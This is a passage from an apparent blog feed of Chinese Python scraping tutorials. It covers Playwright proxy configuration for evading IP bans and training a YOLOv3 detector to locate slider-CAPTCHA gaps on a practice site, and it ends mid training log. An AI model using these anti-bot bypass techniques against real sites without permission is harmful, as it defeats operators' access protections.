class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"Sec-Ch-Ua"</span>: <span class="string">"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\""</span>,</span><br><span class="line">    <span class="attr">"Sec-Ch-Ua-Mobile"</span>: <span class="string">"?0"</span>,</span><br><span class="line">    <span class="attr">"Sec-Fetch-Dest"</span>: <span class="string">"document"</span>,</span><br><span class="line">    <span class="attr">"Sec-Fetch-Mode"</span>: <span class="string">"navigate"</span>,</span><br><span class="line">    <span class="attr">"Sec-Fetch-Site"</span>: <span class="string">"none"</span>,</span><br><span class="line">    <span class="attr">"Sec-Fetch-User"</span>: <span class="string">"?1"</span>,</span><br><span class="line">    <span class="attr">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4498.0 Safari/537.36"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60e99eef-4fa746a01a38abd469ecb467"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>对于 SOCKS 代理，设置方法也是完全一样的，我们只需要把 server 字段的值换成 SOCKS 代理的地址即可：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    browser = p.chromium.launch(proxy=&#123;</span><br><span class="line">        <span class="string">'server'</span>: <span class="string">'socks5://127.0.0.1:7891'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    page = browser.new_page()</span><br><span class="line">    page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(page.content())</span><br><span class="line">    browser.close()</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果和刚才也是完全一样的。</p><p>对于有用户名和密码的代理，Playwright 的设置也非常简单，我们只需要在 proxy 参数额外设置 username 和 password 字段即可，假如用户名和密码分别是 foo 和 bar，则设置方法如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    browser = p.chromium.launch(proxy=&#123;</span><br><span class="line">        <span class="string">'server'</span>: <span class="string">'http://127.0.0.1:7890'</span>,</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'foo'</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'bar'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    page = browser.new_page()</span><br><span class="line">    page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(page.content())</span><br><span class="line">    browser.close()</span><br></pre>      </td>    </tr>  </table></figure><p>这样我们就能非常方便地为 Playwright 实现认证代理的设置。</p><h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9.总结"></a>9.总结</h2><p>以上我们就总结了各个请求库的代理使用方式，各种库的设置方法大同小异，学会了这些方法之后，以后如果遇到封 IP 的问题，我们可以轻松通过加代理的方式来解决。</p><p>本节代码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvUHJveHlUZXN0">https://github.com/Python3WebSpider/ProxyTest<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
  &lt;p&gt;爬虫系列文章总目录：&lt;a href=&quot;https://cuiqingcai.com/17777.html&quot;&gt;【2022 年】Python3 爬虫学习教程&lt;/a&gt;，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
      <category term="代理" scheme="https://cuiqingcai.com/tags/%E4%BB%A3%E7%90%86/"/>
    
      <category term="Python 爬虫" scheme="https://cuiqingcai.com/tags/Python-%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】Python3 爬虫教程 - 深度学习识别滑动验证码缺口</title>
    <link href="https://cuiqingcai.com/202293.html"/>
    <id>https://cuiqingcai.com/202293.html</id>
    <published>2022-03-02T06:31:21.000Z</published>
    <updated>2022-08-01T15:41:25.996Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了，<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">点击了解详情<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>上一节我们使用 OpenCV 识别了图形验证码躯壳欧。这时候就有朋友可能会说了，现在深度学习不是对图像识别很准吗？那深度学习可以用在识别滑动验证码缺口位置吗？</p><p>当然也是可以的，本节我们就来了解下使用深度学习识别滑动验证码的方法。</p><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h2><p>同样地，本节还是主要侧重于完成利用深度学习模型来识别验证码缺口的过程，所以不会侧重于讲解深度学习模型的算法，另外由于整个模型实现较为复杂，本节也不会从零开始编写代码，而是倾向于把代码提前下载下来进行实操练习。</p><p>所以在最后，请提前代码下载下来，仓库地址为：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvRGVlcExlYXJuaW5nU2xpZGVDYXB0Y2hhMu+8jOWIqeeUqA==">https://github.com/Python3WebSpider/DeepLearningSlideCaptcha2，利用<i class="fa fa-external-link-alt"></i></span> Git 把它克隆下来：</p><figure class="highlight crmsh">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/Python3WebSpider/DeepLearningSlideCaptcha2.git</span><br></pre>      </td>    </tr>  </table></figure><p>运行完毕之后，本地就会出现一个 DeepLearningImageCaptcha2 的文件夹，就证明克隆成功了。</p><p>克隆完毕之后，请切换到 DeepLearningImageCaptcha2 文件夹，安装必要的依赖库：</p><figure class="highlight cmake">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pip3 <span class="keyword">install</span> -r requirements.txt</span><br></pre>      </td>    </tr>  </table></figure><p>运行完毕之后，本项目运行所需要的依赖库就全部安装好了。</p><p>以上准备工作都完成之后，那就让我们就开始本节正式的学习吧。</p><h2 id="2-目标检测"><a href="#2-目标检测" class="headerlink" title="2. 目标检测"></a>2. 目标检测</h2><p>识别滑动验证码缺口的这个问题，其实可以归结为目标检测问题。那什么叫目标检测呢？在这里简单作下介绍。</p><p>目标检测，顾名思义，就是把我们想找的东西找出来。比如给一张「狗」的图片，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/4fre2.png" alt="image-20191107024841075"></p><p>我们想知道这只狗在哪，它的舌头在哪，找到了就把它们框选出来，这就是目标检测。</p><p>经过目标检测算法处理之后，我们期望得到的图片是这样的：</p><p><img src="https://qiniu.cuiqingcai.com/i867f.png" alt="image-20191107025008947"></p><p>可以看到这只狗和它的舌头就被框选出来了，这就完成了一个不错的目标检测。</p><p>现在比较流行的目标检测算法有 R-CNN、Fast R-CNN、Faster R-CNN、SSD、YOLO 等，感兴趣可以了解一下，当然不太了解对本节要完成的目标也没有什么影响。</p><p>当前做目标检测的算法主要有两种方法，有一阶段式和两阶段式，英文叫做 One stage 和 Two stage，简述如下：</p><ul>  <li>Two Stage：算法首先生成一系列目标所在位置的候选框，然后再对这些框选出来的结果进行样本分类，即先找出来在哪，然后再分出来是啥，俗话说叫「看两眼」，这种算法有 R-CNN、Fast R-CNN、Faster R-CNN 等，这些算法架构相对复杂，但准确率上有优势。</li>  <li>One Stage：不需要产生候选框，直接将目标定位和分类的问题转化为回归问题，俗话说叫「看一眼」，这种算法有 YOLO、SSD，这些算法虽然准确率上不及 Two stage，但架构相对简单，检测速度更快。</li></ul><p>所以这次我们选用 One Stage 的有代表性的目标检测算法 YOLO 来实现滑动验证码缺口的识别。</p><p>YOLO，英文全称叫做 You Only Look Once，取了它们的首字母就构成了算法名，</p><p>目前 YOLO 算法最新的版本是 V5 版本，应用比较广泛的是 V3 版本，这里算法的具体流程我们就不过多介绍了，感兴趣的可以搜一下相关资料了解下，另外也可以了解下 YOLO V1-V3 版本的不同和改进之处，这里列几个参考链接：</p><ul>  <li>YOLO V3 论文：<span class="exturl" data-url="aHR0cHM6Ly9wanJlZGRpZS5jb20vbWVkaWEvZmlsZXMvcGFwZXJzL1lPTE92My5wZGY=">https://pjreddie.com/media/files/papers/YOLOv3.pdf<i class="fa fa-external-link-alt"></i></span></li>  <li>YOLO V3 介绍：<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNDk5NzI3OQ==">https://zhuanlan.zhihu.com/p/34997279<i class="fa fa-external-link-alt"></i></span></li>  <li>YOLO V1-V3 对比介绍：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbWFrZWZpbGUvcC95b2xvdjMuaHRtbA==">https://www.cnblogs.com/makefile/p/yolov3.html<i class="fa fa-external-link-alt"></i></span></li></ul><h2 id="3-数据准备"><a href="#3-数据准备" class="headerlink" title="3. 数据准备"></a>3. 数据准备</h2><p>像上一节介绍的一样，要训练深度学习模型也需要准备训练数据，数据也是分为两部分，一部分是验证码图像，另一部分是数据标注，即缺口的位置。但和上一节不一样的是，这次标注不再是单纯的验证码文本了，因为这次我们需要表示的是缺口的位置，缺口对应的是一个矩形框，要表示一个矩形框，至少需要四个数据，如左上角点的横纵坐标 x、y，矩形的宽高 w、h，所以标注数据就变成了四个数字。</p><p>所以，接下来我们就需要准备一些验证码图片和对应的四位数字的标注了，比如下图的滑动验证码：</p><p><img src="https://qiniu.cuiqingcai.com/9s7ms.png" alt=""></p><p>好，那接下来我们就完成这两步吧，第一步就是收集验证码图片，第二步就是标注缺口的位置并转为我们想要的四位数字。</p><p>在这里我们的示例网站是 <span class="exturl" data-url="aHR0cHM6Ly9jYXB0Y2hhMS5zY3JhcGUuY2VudGVyL++8jOaJk+W8gOS5i+WQjueCueWHu+eZu+W9leaMiemSruS+v+S8muW8ueWHuuS4gOS4qua7keWKqOmqjOivgeegge+8jOWmguWbvuaJgOekuu+8mg==">https://captcha1.scrape.center/，打开之后点击登录按钮便会弹出一个滑动验证码，如图所示：<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/b0tqg.png" alt="image-20210504182925384"></p><p>我们需要做的就是单独将滑动验证码的图像保存下来，也就是这个区域：</p><p><img src="https://qiniu.cuiqingcai.com/3ihk2.png" alt="image-20210504183039997"></p><p>怎么做呢？靠手工截图肯定不太可靠，费时费力，而且不好准确定位边界，会导致存下来的图片有大有小。为了解决这个问题，我们可以简单写一个脚本来实现下自动化裁切和保存，就是仓库中的 collect.py 文件，代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">COUNT = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, COUNT + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser = webdriver.Chrome()</span><br><span class="line">        wait = WebDriverWait(browser, <span class="number">10</span>)</span><br><span class="line">        browser.get(<span class="string">'https://captcha1.scrape.center/'</span>)</span><br><span class="line">        button = wait.until(EC.element_to_be_clickable(</span><br><span class="line">            (By.CSS_SELECTOR, <span class="string">'.el-button'</span>)))</span><br><span class="line">        button.click()</span><br><span class="line">        captcha = wait.until(</span><br><span class="line">            EC.presence_of_element_located((By.CSS_SELECTOR, <span class="string">'.geetest_slicebg.geetest_absolute'</span>)))</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        captcha.screenshot(<span class="string">f'data/captcha/images/captcha_<span class="subst">&#123;i&#125;</span>.png'</span>)</span><br><span class="line">    <span class="keyword">except</span> WebDriverException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f'webdriver error occurred <span class="subst">&#123;e.msg&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        browser.close()</span><br></pre>      </td>    </tr>  </table></figure><p>在这里我们先定义了一个循环，循环次数为 COUNT 次，每次循环都使用 Selenium 启动一个浏览器，然后打开目标网站，模拟点击登录按钮触发验证码弹出，然后截取验证码对应的节点，再用 screenshot 方法将其保存下来。</p><p>我们将其运行：</p><figure class="highlight vim">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">python3</span> collect.<span class="keyword">py</span></span><br></pre>      </td>    </tr>  </table></figure><p>运行完了之后我们就可以在 <code>data/captcha/images/</code> 目录获得很多验证码图片了，样例如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/plwov.png" alt="image-20210504194022826"></p><p>获得验证码图片之后，我们就需要进行数据标注了，这里推荐的工具是 labelImg，GitHub 地址为 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3R6dXRhbGluL2xhYmVsSW1n77yM5L2/55So">https://github.com/tzutalin/labelImg，使用<i class="fa fa-external-link-alt"></i></span> pip3 安装即可：</p><figure class="highlight cmake">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pip3 <span class="keyword">install</span> labelImg</span><br></pre>      </td>    </tr>  </table></figure><p>安装完成之后可以直接命令行运行：</p><figure class="highlight ebnf">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="attribute">labelImg</span></span><br></pre>      </td>    </tr>  </table></figure><p>这样就成功启动了 labelImg：</p><p><img src="https://qiniu.cuiqingcai.com/sagzl.png" alt="image-20210504194644729"></p><p>点击 <code>Open Dir</code> 打开 <code>data/captcha/images/</code> 目录，然后点击左下角的 <code>Create RectBox</code> 创建一个标注框，我们可以将缺口所在的矩形框框选出来，框选完毕之后 labelImg 就会提示保存一个名称，我们将其命名为 target，然后点击 OK，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/1eqpy.png" alt="image-20210504194608969"></p><p>这时候我们可以发现其保存了一个 xml 文件，内容如下：</p><figure class="highlight xml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="tag">&lt;<span class="name">annotation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">folder</span>&gt;</span>images<span class="tag">&lt;/<span class="name">folder</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filename</span>&gt;</span>captcha_0.png<span class="tag">&lt;/<span class="name">filename</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">path</span>&gt;</span>data/captcha/images/captcha_0.png<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">database</span>&gt;</span>Unknown<span class="tag">&lt;/<span class="name">database</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">width</span>&gt;</span>520<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">height</span>&gt;</span>320<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">depth</span>&gt;</span>3<span class="tag">&lt;/<span class="name">depth</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">segmented</span>&gt;</span>0<span class="tag">&lt;/<span class="name">segmented</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>target<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pose</span>&gt;</span>Unspecified<span class="tag">&lt;/<span class="name">pose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">truncated</span>&gt;</span>0<span class="tag">&lt;/<span class="name">truncated</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">difficult</span>&gt;</span>0<span class="tag">&lt;/<span class="name">difficult</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bndbox</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xmin</span>&gt;</span>321<span class="tag">&lt;/<span class="name">xmin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ymin</span>&gt;</span>87<span class="tag">&lt;/<span class="name">ymin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xmax</span>&gt;</span>407<span class="tag">&lt;/<span class="name">xmax</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ymax</span>&gt;</span>167<span class="tag">&lt;/<span class="name">ymax</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bndbox</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">annotation</span>&gt;</span></span><br></pre>      </td>    </tr>  </table></figure><p>其中可以看到 size 节点里有三个节点，分别是 width、height、depth，分别代表原验证码图片的宽度、高度、通道数。另外 object 节点下的 bndbox 节点就包含了标注缺口的位置，通过观察对比可以知道 xmin、ymin 指的就是左上角的坐标，xmax、ymax 指的就是右下角的坐标。</p><p>我们可以用下面的方法简单进行下数据处理：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> xmltodict</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_xml</span><span class="params">(file)</span>:</span></span><br><span class="line">    xml_str = open(file, encoding=<span class="string">'utf-8'</span>).read()</span><br><span class="line">    data = xmltodict.parse(xml_str)</span><br><span class="line">    data = json.loads(json.dumps(data))</span><br><span class="line">    annoatation = data.get(<span class="string">'annotation'</span>)</span><br><span class="line">    width = int(annoatation.get(<span class="string">'size'</span>).get(<span class="string">'width'</span>))</span><br><span class="line">    height = int(annoatation.get(<span class="string">'size'</span>).get(<span class="string">'height'</span>))</span><br><span class="line">    bndbox = annoatation.get(<span class="string">'object'</span>).get(<span class="string">'bndbox'</span>)</span><br><span class="line">    box_xmin = int(bndbox.get(<span class="string">'xmin'</span>))</span><br><span class="line">    box_xmax = int(bndbox.get(<span class="string">'xmax'</span>))</span><br><span class="line">    box_ymin = int(bndbox.get(<span class="string">'ymin'</span>))</span><br><span class="line">    box_ymax = int(bndbox.get(<span class="string">'ymax'</span>))</span><br><span class="line">    box_width = (box_xmax - box_xmin) / width</span><br><span class="line">    box_height = (box_ymax - box_ymin) / height</span><br><span class="line">    <span class="keyword">return</span> box_xmin / width, box_ymin / height, box_width / width, box_height / height</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们定义了一个 parse_xml 方法，这个方法首先读取了 xml 文件，然后使用 xmltodict 库就可以将 XML 字符串转为 JSON，然后依次读取出验证码的宽高信息，缺口的位置信息，最后返回了想要的数据格式—— 缺口左上角的坐标和宽高相对值，以元组的形式返回。</p><p>都标注完成之后，对每个 xml 文件调用此方法便可以生成想要的标注结果了。</p><p>在这里，我已经将对应的标注结果都处理好了，可以直接使用，路径为 data/captcha/labels，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/j358p.png" alt="image-20210504200730482"></p><p>每个 txt 文件对应一张验证码图的标注结果，内容类似如下：</p><figure class="highlight basic">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="symbol">0 </span><span class="number">0.6153846153846154</span> <span class="number">0.275</span> <span class="number">0.16596774</span> <span class="number">0.24170968</span></span><br></pre>      </td>    </tr>  </table></figure><p>第一位 0 代表标注目标的索引，由于我们只需要检测一个缺口，所以索引就是 0；第 2、3 位代表缺口的左上角的位置，比如 0.615 则代表缺口左上角的横坐标在相对验证码的 61.5% 处，乘以验证码的宽度 520，结果大约就是 320，即左上角偏移值是 320 像素；第 4、5 代表缺口的宽高相对验证码图片的占比，比如第 5 位 0.24 乘以验证码的高度 320，结果大约是 77，即缺口的高度大约为 77 像素。</p><p>好了，到此为止数据准备阶段就完成了。</p><h2 id="4-训练"><a href="#4-训练" class="headerlink" title="4. 训练"></a>4. 训练</h2><p>为了更好的训练效果，我们还需要下载一些预训练模型。预训练的意思就是已经有一个提前训练过的基础模型了，我们可以直接使用提前训练好的模型里面的权重文件，我们就不用从零开始训练了，只需要基于之前的模型进行微调就好了，这样既可以节省训练时间，又可以有比较好的效果。</p><p>YOLOV3 的训练要加载预训练模型才能有不错的训练效果，预训练模型下载命令如下：</p><figure class="highlight arduino">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">bash <span class="built_in">prepare</span>.sh</span><br></pre>      </td>    </tr>  </table></figure><blockquote>  <p>注意：在 Windows 下请使用 Bash 命令行工具如 Git Bash 来运行此命令。</p></blockquote><p>执行这个脚本，就能下载 YOLO V3 模型的一些权重文件，包括 yolov3 和 weights 还有 darknet 的 weights，在训练之前我们需要用这些权重文件初始化 YOLO V3 模型。</p><p>接下来就可以开始训练了，执行如下脚本：</p><figure class="highlight armasm">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">bash </span>train.sh</span><br></pre>      </td>    </tr>  </table></figure><blockquote>  <p>注意：在 Windows 下请同样使用 Bash 命令行工具如 Git Bash 来运行此命令。</p></blockquote><p>同样推荐使用 GPU 进行训练，训练过程中我们可以使用 TensorBoard 来看看 loss 和 mAP 的变化，运行 TensorBoard：</p><figure class="highlight angelscript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">tensorboard --logdir=<span class="string">'logs'</span> --port=<span class="number">6006</span> --host <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br></pre>      </td>    </tr>  </table></figure><blockquote>  <p>注意：请确保已经正确安装了本项目的所有依赖库，其中就包括 TensorBoard，安装成功之后便可以使用 tensorboard 命令。</p></blockquote><p>运行此命令后可以在 <span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo2MDA2">http://localhost:6006<i class="fa fa-external-link-alt"></i></span> 观察到训练过程中的 loss 变化。</p><p>loss_1 变化类似如下：</p><p><img src="https://qiniu.cuiqingcai.com/qrowq.png" alt="loss 变化"></p><p>val_mAP 变化类似如下：</p><p><img src="https://qiniu.cuiqingcai.com/pylwj.png" alt="mAP 变化"></p><p>可以看到 loss 从最初的非常高下降到了很低，准确率也逐渐接近 100%。</p><p>这是训练过程中的命令行的一些输出结果：</p><figure class="highlight gherkin">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>      </td>      <td class="code">        <pre><span class="line">---- [Epoch 99/100, Batch 27/29] ----</span><br><span class="line">+------------+--------------+--------------+--------------+</span><br><span class="line">|<span class="string"> Metrics    </span>|<span class="string"> YOLO Layer 0 </span>|<span class="string"> YOLO Layer 1 </span>|<span class="string"> YOLO Layer 2 </span>|</span><br><span class="line">+------------+--------------+--------------+--------------+</span><br><span class="line">|<span class="string"> grid_size  </span>|<span class="string"> 14           </span>|<span class="string"> 28           </span>|<span class="string"> 56           </span>|</span><br><span class="line">|<span class="string"> loss       </span>|<span class="string"> 0.028268     </span>|<span class="string"> 0.046053     </span>|<span class="string"> 0.043745     </span>|</span><br><span class="line">|<span class="string"> x          </span>|<span class="string"> 0.002108     </span>|<span class="string"> 0.005267     </span>|<span class="string"> 0.008111     </span>|</span><br><span class="line">|<span class="string"> y          </span>|<span class="string"> 0.004561     </span>|<span class="string"> 0.002016     </span>|<span class="string"> 0.009047     </span>|</span><br><span class="line">|<span class="string"> w          </span>|<span class="string"> 0.001284     </span>|<span class="string"> 0.004618     </span>|<span class="string"> 0.000207     </span>|</span><br><span class="line">|<span class="string"> h          </span>|<span class="string"> 0.000594     </span>|<span class="string"> 0.000528     </span>|<span class="string"> 0.000946     </span>|</span><br><span class="line">|<span class="string"> conf       </span>|<span class="string"> 0.019700     </span>|<span class="string"> 0.033624     </span>|<span class="string"> 0.025432     </span>|</span><br><span class="line">|<span class="string"> cls        </span>|<span class="string"> 0.000022     </span>|<span class="string"> 0.000001     </span>|<span class="string"> 0.000002     </span>|</span><br><span class="line">|<span class="string"> cls_acc    </span>|<span class="string"> 100.00%      </span>|<span class="string"> 100.00%      </span>|<span class="string"> 100.00%      </span>|</span><br><span class="line">|<span class="string"> recall50   </span>|<span class="string"> 1.000000     